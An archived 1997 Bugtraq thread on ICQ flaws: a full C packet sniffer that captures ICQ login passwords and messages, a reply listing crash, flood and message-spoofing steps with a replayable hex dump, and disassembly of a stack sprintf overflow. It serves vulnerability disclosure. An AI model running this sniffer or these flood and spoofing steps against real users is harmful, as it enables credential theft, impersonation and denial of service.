@@ -1,0 +1,883 @@
+                           ICQ so-called protocol
+
+Description: The ICQ protocol is ridiculously simplistic and is riddled
+with security holes. So is the ICQ software. So ICQ users can be spoofed,
+have their machine crashed, or have evil haxxors run arbitrary code on
+their boxes. Geez, these poor users might as well run Internet Explorer!
+Author: Alan Cox <alan@CYMRU.NET>
+Compromise: Spoof, Crash, or exploit the buffer overflow to run arbitrary
+code
+Vulnerable Systems: Mostly Windows boxes where the user is running ICQ
+Date: 14 December 1997
+
+Date: Sun, 14 Dec 1997 14:20:27 GMT
+
+From: Alan Cox <alan@CYMRU.NET>
+
+To: BUGTRAQ@NETSPACE.ORG
+
+Subject: Vulnerabilities in ICQ
+
+/*
+
+This is a little toy to demo the weaknesses in Mirabilis ICQ system. There
+
+are two major problems with the ICQ protocol clearly visible. As its an
+
+unpublished proprietary system we can assume there may well be far more
+
+lurking. Its also too apparent why they dont publish it - my guess has to
+
+be "embarrasment factor"
+
+The first flaw is plain dumb. They send plaintext authentication. Not only
+
+that they send it once per session.
+
+The second flaw is that they use easily guessable sequence numbers - starting
+
+from 0 each user session, they use UDP and to make life even easier their
+
+query service will tell you exactly what IP address to spoof as source when
+
+faking them. So you can find someone is on, find their IP and spoof sequences
+
+0->100 with a fair bet that somewhere before the 100th fake message you'll
+
+get several hits and spoof messages. If not you can winnuke the victim so
+
+he'll be back on a low sequence number 8)
+
+Let us hope the proposed Rendezvous Protocol that is supposed to become
+
+an internet draft is better designed and that the ICQ people switch to it.
+
+There really is no excuse for using crude plaintext and simplistic sequence
+
+spaces when five minutes thought could have resolved almost every weakness
+
+except password change without US export controlled crypto.
+
+I've enclosed a demo that does password sniffing for ICQ. It requires you
+
+can work out how to set it up and it doesnt including spoofing code.
+
+Alan
+
+*/
+
+/*
+
+ *      Snoop ICQ traffic for a set host. Shows how simplistic ICQ is and
+
+ *      how easy it is to snoop it.
+
+ */
+
+#include <stdio.h>
+
+#include <string.h>
+
+#include <stdlib.h>
+
+#include <signal.h>
+
+#include <ctype.h>
+
+#include <sys/socket.h>
+
+#include <net/if.h>
+
+#include <net/if_arp.h>
+
+#include <netinet/in.h>
+
+#include <linux/ip.h>
+
+#include <linux/udp.h>
+
+/*
+
+ *      PUT THE IP ADDRESS OF THE CLIENT TO SNOOP HERE OR IT WONT WORK
+
+ */
+
+#define MY_CLIENT_TO_WATCH      0x7F000001
+
+static int create_socket(void)
+
+{
+
+        int s=socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
+
+        if(s==-1)
+
+        {
+
+                perror("socket");
+
+                exit(1);
+
+        }
+
+        return s;
+
+}
+
+static void close_socket(int s)
+
+{
+
+        close(s);
+
+}
+
+static void promiscuous(int s, char *iface, int onoff)
+
+{
+
+        struct ifreq ifr;
+
+        strcpy(ifr.ifr_name, iface);
+
+        if(ioctl(s, SIOCGIFFLAGS, &ifr)==-1)
+
+        {
+
+                perror("SIOCGIFFLAGS");
+
+                exit(1);
+
+        }
+
+        strcpy(ifr.ifr_name, iface);
+
+        if(onoff)
+
+                ifr.ifr_flags|=IFF_PROMISC;
+
+        else
+
+                ifr.ifr_flags&=~IFF_PROMISC;
+
+        if(ioctl(s, SIOCSIFFLAGS, &ifr)==-1)
+
+        {
+
+                perror("SIOCSIFFLAGS");
+
+                exit(1);
+
+        }
+
+}
+
+static __inline__ ip_p(unsigned char *packet, int len)
+
+{
+
+        if(packet[12]==0x08 && packet[13]==0x00)
+
+                return 1;
+
+        return 0;
+
+}
+
+struct icqhdr
+
+{
+
+        unsigned char version[2] __attribute((packed)); /* ?? */
+
+        unsigned short command __attribute((packed));
+
+        unsigned short sequence __attribute((packed));
+
+        unsigned long uid __attribute((packed));
+
+        unsigned char data[0];
+
+};
+
+struct icqack
+
+{
+
+        unsigned char version[2] __attribute((packed)); /* ?? */
+
+        unsigned short result __attribute((packed));
+
+        unsigned short sequence __attribute((packed));
+
+        unsigned char data[0];
+
+};
+
+struct icqstring
+
+{
+
+        unsigned short len;
+
+        char data[0];
+
+};
+
+struct icqlogin
+
+{
+
+        struct icqhdr hdr __attribute((packed));
+
+        unsigned long dunno __attribute((packed)); /* 000006FE.L */
+
+        unsigned short pw_len __attribute((packed));
+
+        unsigned char pw_data[11] __attribute((packed));
+
+        struct in_addr addr __attribute((packed));
+
+        /* Rest is a mystery right now */
+
+        /* 0.L */
+
+        /* 2.L */
+
+        /* 0000004C, 00000000 */
+
+        /* 00 78 */
+
+};
+
+static void print_icq_string(struct icqstring *s)
+
+{
+
+        fwrite(s->data, s->len-1, 1, stdout);
+
+}
+
+/*
+
+ *      Scan a packet for clues
+
+ */
+
+static int process_packet(struct sockaddr *sa, unsigned char *packet, int len)
+
+{
+
+        int i;
+
+        int lv;
+
+        int d=0;
+
+        static long num=0;
+
+        struct iphdr *iph;
+
+        struct udphdr *udphdr;
+
+        if(strcmp(sa->sa_data,"eth0"))
+
+                return 0;               /* Wrong port */
+
+        if(!ip_p(packet, len))
+
+                return 0;
+
+        iph=(struct iphdr *)(packet+14);
+
+        udphdr=(struct udphdr *)(iph+1);
+
+        /* assume no options */
+
+        lv=ntohs(udphdr->len);
+
+        if( udphdr->source !=htons(4000) && udphdr->dest!=htons(4000))
+
+        {
+
+                return 0;
+
+        }
+
+/*      printf("packet %d   \r", ++num);*/
+
+        if(iph->saddr==htonl(MY_CLIENT_TO_WATCH))
+
+        {
+
+                printf("To Server: %d bytes\n", lv);
+
+        }
+
+        else if(iph->daddr==htonl(MY_CLIENT_TO_WATCH))
+
+        {
+
+                printf("From Server: %d bytes\n", lv);
+
+                d=1;
+
+        }
+
+        else return 0;
+
+        i=14+sizeof(struct iphdr);
+
+        if(len-i>lv)
+
+                len=i+lv;
+
+        i+=sizeof(struct udphdr);
+
+/*      printf("UDP size %d\n",i);*/
+
+        if(i>=sizeof(struct icqhdr)+sizeof(struct udphdr))
+
+        {
+
+                struct icqhdr *p=(struct icqhdr *)(udphdr+1);
+
+                if(d==0)
+
+                {
+
+                        printf("From %ld\n",p->uid);
+
+                        printf("Version: %d.%d\nCommand ",
+
+                                p->version[1], p->version[0]);
+
+                        switch(p->command)
+
+                        {
+
+                                case 0x000A:
+
+                                        printf("Ack");
+
+                                        break;
+
+                                case 0x03E8:
+
+                                {
+
+                                        struct icqlogin *il=(struct icqlogin *)p;
+
+                                        printf("Login Password ");
+
+                                        print_icq_string((struct icqstring *)&il->pw_len);
+
+                                        printf(" IP %s", inet_ntoa(il->addr));
+
+                                        break;
+
+                                }
+
+#if 0
+
+                                case 0x0x??
+
+                                {
+
+                                        struct in_addr v=*(struct in_addr *)p->data;
+
+                                        printf("Ping %s", inet_ntoa(v));
+
+                                        break;
+
+                                }
+
+#endif
+
+                                case 0x409:
+
+                                {
+
+                                        printf("Ping");
+
+                                        break;
+
+                                }
+
+                                case 0x0438:
+
+                                {
+
+                                        struct icqstring *s=(struct icqstring *)p->data;
+
+                                        printf("Disconnect (");
+
+                                        print_icq_string(s);
+
+                                        printf(")");
+
+                                        break;
+
+                                }
+
+                                case 0x0456:
+
+                                {
+
+                                        /* data +4,5 is always 0100 */
+
+                                        struct icqstring *s=(struct icqstring *)(p->data+6);
+
+                                        printf("Message to %ld  ", *((long *)p->data));
+
+                                        print_icq_string(s);
+
+                                        break;
+
+                                }
+
+                                case 0x0460:
+
+                                {
+
+                                        printf("Information %ld on ID %d",
+
+                                                *((short *)p->data),
+
+                                                *((long *)(p->data+2))
+
+                                        );
+
+                                        break;
+
+                                }
+
+                                case 0x046A:
+
+                                {
+
+                                        printf("Information_2 %ld on ID %d",
+
+                                                *((short *)p->data),
+
+                                                *((long *)(p->data+2))
+
+                                        );
+
+                                        break;
+
+                                }
+
+                                case 0x04D8:
+
+                                {
+
+                                        printf("Status ");
+
+                                        switch(*((long *)p->data))
+
+                                        {
+
+                                                case 0x00:
+
+                                                        printf("[Away 0]");
+
+                                                        break;
+
+                                                case 0x01:
+
+                                                        printf("[Away 1]");
+
+                                                        break;
+
+                                                case 0x10:
+
+                                                        printf("[DND 0]");
+
+                                                        break;
+
+                                                case 0x11:
+
+                                                        printf("[DND 1]");
+
+                                                        break;
+
+                                                default:
+
+                                                        printf("%04X",
+
+                                                                *((long *)p->data));
+
+                                        }
+
+                                        break;
+
+                                }
+
+                                default:
+
+                                        printf("%04X", p->command);
+
+                        }
+
+                        if(p->sequence)
+
+                                printf("\nSequence %d\n",
+
+                                        p->sequence);
+
+                        else
+
+                                printf("\n");
+
+                }
+
+        }
+
+        if(i>=sizeof(struct icqack)+sizeof(struct udphdr))
+
+        {
+
+                struct icqack *p=(struct icqack *)(udphdr+1);
+
+                if(d==1)
+
+                {
+
+                        printf("Version: %d.%d\nReply ",
+
+                                p->version[1], p->version[0]);
+
+                        switch(p->result)
+
+                        {
+
+                                case 0x000A:
+
+                                        printf("Ack");
+
+                                        break;
+
+                                case 0x00E6:
+
+                                        printf("Away Reply ");
+
+                                        printf("for %ld",
+
+                                                *((long *)p->data));
+
+                                        break;
+
+                                case 0x0118:
+
+                                {
+
+                                        struct icqstring *is;
+
+                                        printf("InfoID %d\n",
+
+                                                *((short *)p->data));
+
+                                        printf("ICQ ID %ld\n",
+
+                                                *((long *)p->data+2));
+
+                                        is=(struct icqstring *)(p->data+6);
+
+                                        printf("Nick ");
+
+                                        print_icq_string(is);
+
+                                        is=(struct icqstring *)(((char *)is)+is->len+2);
+
+                                        printf("\nName ");
+
+                                        print_icq_string(is);
+
+                                        is=(struct icqstring *)(((char *)is)+is->len+2);
+
+                                        printf(" ");
+
+                                        print_icq_string(is);
+
+                                        is=(struct icqstring *)(((char *)is)+is->len+2);
+
+                                        printf("\nEMail ");
+
+                                        print_icq_string(is);
+
+                                        is=(struct icqstring *)(((char *)is)+is->len+2);
+
+                                        printf("\nInfo ");
+
+                                        print_icq_string(is);
+
+                                        break;
+
+                                }
+
+                                default:
+
+                                        printf("%04X", p->result);
+
+                        }
+
+                        if(p->sequence)
+
+                                printf("\nSequence %d\n",
+
+                                        p->sequence);
+
+                        else
+
+                                printf("\n");
+
+                }
+
+        }
+
+        while(i<len)
+
+        {
+
+                int x;
+
+                for(x=0; x<8 && i+x<len; x++)
+
+                {
+
+                        printf("%02X ", packet[i+x]);
+
+                }
+
+                printf("    ");
+
+                for(x=0;x<8 && i+x<len; x++)
+
+                {
+
+                        unsigned char c=packet[i+x];
+
+                        if(c>=32 && c< 127)
+
+                                printf("%c", c);
+
+                        else
+
+                                printf(".");
+
+                }
+
+                printf("\n");
+
+                i+=8;
+
+        }
+
+        printf("\n");
+
+        fflush(stdout);
+
+        return 0;
+
+}
+
+int main(int argc, char *argv[])
+
+{
+
+        int s;
+
+        unsigned char buf[1600];
+
+        struct sockaddr sa;
+
+        int salen;
+
+        int len;
+
+        s=create_socket();
+
+        promiscuous(s, "eth0", 1);
+
+        while(1)
+
+        {
+
+                salen=sizeof(sa);
+
+                if((len=recvfrom(s, (char *)buf, 1600, 0, &sa, &salen))==-1)
+
+                {
+
+                        perror("recvfrom");
+
+                        close_socket(s);
+
+                        exit(1);
+
+                }
+
+                process_packet(&sa, buf,len);
+
+        }
+
+        printf("An error has occured.\n");
+
+        close_socket(s);
+
+        exit(0);
+
+}
+
+Date: Sun, 14 Dec 1997 21:17:14 -0500
+
+From: Seth McGann <smm@WPI.EDU>
+
+To: BUGTRAQ@NETSPACE.ORG
+
+Subject: Re: Vulnerabilities in ICQ
+
+At 14:20 12/14/97 GMT, you wrote:
+
+The Client-To-Client Protocol used by ICQ is even worse.  It does no
+
+authentication of any kind and places all trust in the client.  Spoofing
+
+messages  from arbitrary ICQ users is easy, as is sending file and chat
+
+requests.  Even worse, if the client gets anything it doesn't expect it
+
+crashes(!) sometimes taking Windows with it.  There is also no flood
+
+protection and packet replay is possible.  A few thousand messages will
+
+slow my P166 to a crawl.  The only good thing ICQ did was pick a different
+
+port number for each session (well, not really its usually around 1024 as
+
+windows seems to allocate port numbers in order.)  So, an attack would go
+
+as follows:
+
+1. Port scan the target IP looking form 1024-2000 or so.
+
+2. Send some random data to crash it.  Using netcat is good for this. (or)
+
+3. Take a valid ICQ message and resend it a million times. (or)
+
+4. Take a valid ICQ message and change the User Identification Numbers. (or)
+
+5. Be creative :)
+
+To reverse engineer the protocol, simply study the results of different ICQ
+
+activities with a sniffer or some type of Winsock watcher.  I have figured
+
+out quite a bit about the protocol and will release a more formal writeup
+
+soon.  Anyone with a few hours should be able to writeup a suitable client
+
+message spoofer.  I am writing this as I have been exploiting these
+
+vulnerablites for quite some time and I haven't seen anything about this on
+
+usenet or the mailing lists.  As an example, I have provided the transcript
+
+of a message.
+
+This is an example of a simple message (there are many other types of
+
+traffic) of "12345" from UIN 3399052:
+
+>> 0000:   2D 00   <- Prefix (if this is wrong bad things happen)
+
+>> 0000:   8C DD 33 00 02 00 EE 07   00 00 8C DD 33 00 01 00
+
+>> 0010:   06 00 31 32 33 34 35 00   82 D7 F3 20 82 D7 F3 20
+
+>> 0020:   09 04 00 00 04 00 00 10   01 ED FF FF FF
+
+<< 0000:   28 00   <- Post fix and ACK
+
+<< 0000:   5D 29 35 00 02 00 DA 07   00 00 5D 29 35 00 01 00
+
+<< 0010:   01 00 00 82 D7 F3 25 82   D7 F3 25 22 07 00 00 04
+
+<< 0020:   00 00 00 00 ED FF FF FF
+
+Simply send this alot for a flood using netcat (ignoring the responses of
+
+course).  I wrote a few simple exploits, but they used the socket faq
+
+library and seem redundant at this point, so I leave exploitation as an
+
+exercise to the reader.
+
+Seth M. McGann / smm@wpi.edu        "Security is making it
+
+http://www.wpi.edu/~smm              to the bathroom in time."
+
+KeyID: 1024/2048/5FC59C0A
+
+Fingerprint F315 1C37 CF3C 3612 3B28  BC84 C430 BC22 5FC5 9C0A
+
+Date: Tue, 16 Dec 1997 20:20:41 -0300
+
+From: Solar Designer <solar@FALSE.COM>
+
+To: BUGTRAQ@NETSPACE.ORG
+
+Subject: Re: Vulnerabilities in ICQ
+
+Hello,
+
+> The Client-To-Client Protocol used by ICQ is even worse.  It does no
+
+> authentication of any kind and places all trust in the client.  Spoofing
+
+> messages  from arbitrary ICQ users is easy, as is sending file and chat
+
+> requests.  Even worse, if the client gets anything it doesn't expect it
+
+> crashes(!) sometimes taking Windows with it.
+
+Spoofing chat requests? Crashes?
+
+00422D4D                 lea     ecx, [ebp-118h]
+
+00422D53                 push    dword ptr [esi+18h]
+
+00422D56                 push    offset aTheFollowingRe
+
+00422D5B                 push    ecx
+
+00422D5C                 call    ds:sprintf
+
+...
+
+004B58F8 aTheFollowingRe db 0Dh,0Ah              ; DATA XREF: _text:00422D56o
+
+004B58F8                 db 'The following reason for a chat request was given: ',0Dh,0Ah
+
+004B58F8                 db ' %s',0Dh,0Ah,0
+
+Unless there's bound checking done before we get here, this overflow is
+
+exploitable -- the buffer is on the stack. I'm too lazy to boot Windows
+
+to check now.
+
+Anyway, there're 100+ references to sprintf() and strcpy() in ICQ, at least
+
+some of these have to be exploitable. IDA (the disassembler) is even able to
+
+detect standard MSVC functions, so you get symbolic names for them right
+
+after the disassembly, and can open a window with the cross references list.
+
+Signed,
+
+Solar Designer
+
+Addendum(if any):
